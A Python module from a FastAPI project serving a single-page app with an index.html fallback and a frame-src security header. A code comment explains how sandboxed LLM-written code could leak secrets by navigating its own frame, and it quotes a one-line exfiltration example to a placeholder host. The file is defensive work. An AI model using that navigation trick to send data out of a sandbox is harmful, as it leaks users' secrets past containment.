"""SPA static-file serving with an HTML5 history fallback.

Extracted from ``api/app.py`` (#54: split the monolithic ``create_app`` module
into focused units). ``SpaStaticFiles`` is mounted at ``/`` after every API
route so that client-side routes resolve to ``index.html`` on refresh.
"""

from __future__ import annotations

from fastapi.staticfiles import StaticFiles

#: The one thing the app document has to say about its child frames.
#:
#: A WUI runs LLM-written code in a sandboxed frame carrying its own
#: `default-src 'none'`, which stops it fetching, opening a window, submitting a
#: form or nesting another frame. It does NOT stop the frame navigating ITSELF:
#: CSP has no directive for that — `navigate-to` was dropped from CSP3 and never
#: shipped — so `location.href = "https://x/?d=" + secret` sent everything the
#: page could read straight out. Measured in Chromium, with every other route
#: confirmed blocked.
#:
#: A child frame's navigation is governed by the CONTAINING document's
#: `frame-src`, so this is the only place that can close it; nothing inside the
#: assembled page is the right actor. It also removes the second half of the
#: same hole — a navigated-away frame keeps its `WindowProxy` identity, so the
#: parent's replies (necessarily `postMessage(…, "*")`, an opaque origin cannot
#: be named) would have been delivered to whatever now occupied it.
#:
#: Exactly one directive, deliberately: every other resource on this page is
#: left alone, so this cannot break anything but a frame pointed off-origin.
#: `'self'` covers the PDF preview and the KB blob viewers; `blob:`/`data:`
#: cover the ones built in the browser. A `srcdoc` frame needs no source of its
#: own — it inherits.
SPA_CSP = "frame-src 'self' blob: data:"


class SpaStaticFiles(StaticFiles):
    """Serve the built SPA with an HTML5 history fallback: any path that
    isn't a real file resolves to index.html, so refreshing a client-side
    route (e.g. /a/{slug}/items/{id}) boots the app instead of 404-ing.
    API routes are registered before this mount, so they take precedence."""

    async def get_response(self, path: str, scope):  # type: ignore[no-untyped-def]
        from starlette.exceptions import HTTPException as StarletteHTTPException

        served_index = path in ("", ".", "/", "index.html")
        try:
            response = await super().get_response(path, scope)
        except StarletteHTTPException as exc:
            if exc.status_code != 404:
                raise
            # #177: every backend route lives under /api. An unmatched /api/*
            # request is a real API miss — let it 404 as JSON, NOT the SPA
            # history fallback (returning index.html would mask broken calls).
            if path == "api" or path.startswith("api/"):
                raise
            served_index = True  # history fallback → index.html
            response = await super().get_response("index.html", scope)
        # index.html must always be revalidated so a rebuild's new hashed-asset
        # references are picked up; the hashed assets themselves stay cacheable.
        if served_index:
            response.headers["Cache-Control"] = "no-cache"
            # On the document, not the assets: this governs the frames the
            # document mounts, and index.html is the only response that is one.
            response.headers["Content-Security-Policy"] = SPA_CSP
        return response
